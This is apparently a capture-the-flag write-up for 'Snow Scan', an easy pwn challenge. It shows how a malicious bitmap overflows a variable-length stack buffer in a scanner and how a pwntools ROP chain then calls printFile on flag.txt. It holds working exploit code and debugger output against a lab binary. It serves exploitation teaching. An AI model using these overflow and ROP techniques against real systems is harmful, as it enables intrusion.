Snow Scan
15th April 2022 / Document No. D22.102.260
Prepared By: ir0nstone
Challenge Author(s): 131LL
Difficulty: Easy
Classification: Official

Synopsis
Snow Scan is an easy pwn challenge that
features a site with a bitmap upload page, running a scanner server-side against the uploaded file.
Given a malicious bitmap, the attacker can trigger a buffer overflow within the scanner and gain
code execution.

Skills Required
Buffer Overflows

Skills Learned
Basic ROP technique

Analysis
Protections

Once loaded in within main() , the dataOffset field contains the offset that the pixel bytes are
stored in. fseek() is used to set the file position:
BMPFile *bmp = loadBitmap(file);
fseek(file, bmp->dataOffset, SEEK_SET);

A uint8_t buffer is declared, with a size depending on our bitmap's imageSize field. The pixel
data is then read into the buffer, and a scan is performed:
uint8_t pixelBuf[bmp->imageSize];
int c = 0, i = 0;
while((c = fgetc(file)) != EOF)
pixelBuf[i++] = (uint8_t)c;
scan(pixelBuf, bmp->width);

A noteworthy function is printFile(char *fname) , which we will likely be useful during
exploitation.

Finding a Buffer Overflow
The program generally trusts the bitmap we have supplied (minus a few checks). A serious bug can
easily be found in main() :
uint8_t pixelBuf[bmp->imageSize];
int c = 0, i = 0;
while((c = fgetc(file)) != EOF)
pixelBuf[i++] = (uint8_t)c;

We control the bitmap imageSize field, so we can make this buffer as long or as short as we need
- within the acceptable range of 400-900 bytes long, as specified by the constants
#define MIN_IMGSIZE 400 // 20x20
#define MAX_IMGSIZE 900 // 30x30

Which are then used in loadBitmap() :
if(bmp->imageSize < MIN_IMGSIZE || bmp->imageSize > MAX_IMGSIZE)
error("Invalid bitmap size. The acceptaple resolution range is 20x20 to
30x30.");

Then, the pixel bytes are read until an EOF is encountered. In an ordinary bitmap this would be
fine, but what if the pixel data is longer than the imageSize attribute suggests? This is a classic
buffer overflow vulnerability, and we will be taking advantage of it to pwn this challenge.

Exploitation
Planning a ROP Chain
Now let's focus on what our ROP chain will look like. The easiest way is to use the printFile()
function and pass in a pointer to flag.txt .In order to do this, we first need to find a way to write
the string "flag.txt" to a known address in memory, so we can refer to it using a pointer.
Since the binary is statically linked, there are plenty of gadgets to choose from to achieve this. We
will be using this mov qword ptr gadget:
pwndbg> rop --grep ": mov qword ptr "
...
0x000000000044e2bf : mov qword ptr [rdi], rsi ; ret
...

The .bss is an ideal section to write in. We will load the address of .bss into RDI, and the string
"flag.txt" into RSI. Since it's just 8 bytes long, one write is enough. After this, we just need to call
printFile .

Getting RIP Control
Let's now focus on building a bitmap and incorporating the payload into it. We can use the dummy
bitmap given to us as our base, but building a differently sized bitmap from scratch is also a valid
approach.
Let's create a bitmap with an overflowing cyclic pattern to determine the offset the crash occurs at:
from pwn import *
# use dummy bitmap as a base
with open('dummy.bmp', 'rb') as f:
dat = f.read()
dataOffset = struct.unpack('<I', dat[10:14])[0]
# cut out existing pixel data
dat = dat[:dataOffset]
# insert pattern
dat += cyclic(800)
# save
with open('cyclic.bmp', 'wb') as f:
f.write(dat)

The problem here is that the array is a variable-length array (or VLA):
uint8_t pixelBuf[bmp->imageSize];

This means that the length of the array changes depending on calculations during execution. In
order to work, VLAs store a pointer to themselves on the stack as well. We are overwriting this
pointer, which leads to the segmentation fault - we are overwriting the pointer we are using to
write to!

In order to bypass this, we'll have to partially overwrite the last byte of this VLA pointer to point
further up the stack, to enable us to overwrite the return pointer.
We can see that the VLA pointer is located at rbp - 0x60 :
pwndbg> x/gx $rbp-0x60
0x7fffffffde40: 0x00007fffffffdb60
pwndbg> x/s 0x00007fffffffdb60
0x7fffffffdb60: 'a' <repeats 200 times>...
rbp-0x64 holds the character that is getting written:
pwndbg> x/wx $rbp-0x64
0x7fffffffde3c: 0x00000061

By debugging, we can see that there is 736 bytes until the VLA pointer. We'll pad up to it,
overwrite it with a high byte (say 0xf0 ), then see where on the stack our exploit ends up.
dat += b'a'*736
dat += b'\xf0'
dat += b'A' * 8

If we break on the retn in main , we see that RSP has the value 0x7fffffffdef8 :
*RSP

0x7fffffffdef8 —▸ 0x402d80 (__libc_start_main+1168) ◂— mov edi, eax

Meanwhile, our AAAAAAAA is located at 0x7fffffffdec1 :
pwndbg> search -t bytes AAAAAAAA
Searching for value: 'AAAAAAAA'
[heap]

0x4c74c7 'AAAAAAAA'

[stack]

0x7fffffffdec1 0x4141414141414141 ('AAAAAAAA')

The difference between these two is 0x37 , so we pad with 0x37 A characters and get up to the
saved return pointer:
pwndbg> x/gx $rsp
0x7fffffffdef8: 0x0000000000402d80
pwndbg> x/gx $rsp - 0x8
0x7fffffffdef0: 0x4141414141414141

Now we can just write our ropchain to the stack!

Developing the Ropchain
We can prettify the current chain using pwntools', and add in the call to printFile :
bss = elf.bss(32)
# mov qword ptr [rdi], rsi
mov_qword = 0x44e2bf

rop = ROP(elf, checksec=False)
rop.raw(dat)
rop.raw('a' * 736)
rop.raw(b'\xe0')
rop.raw('A' * 0x37)
rop(rdi=bss, rsi=b'flag.txt')
rop.raw(mov_qword)
rop.printFile()
# save
with open('cyclic.bmp', 'wb') as f:
f.write(rop.chain())
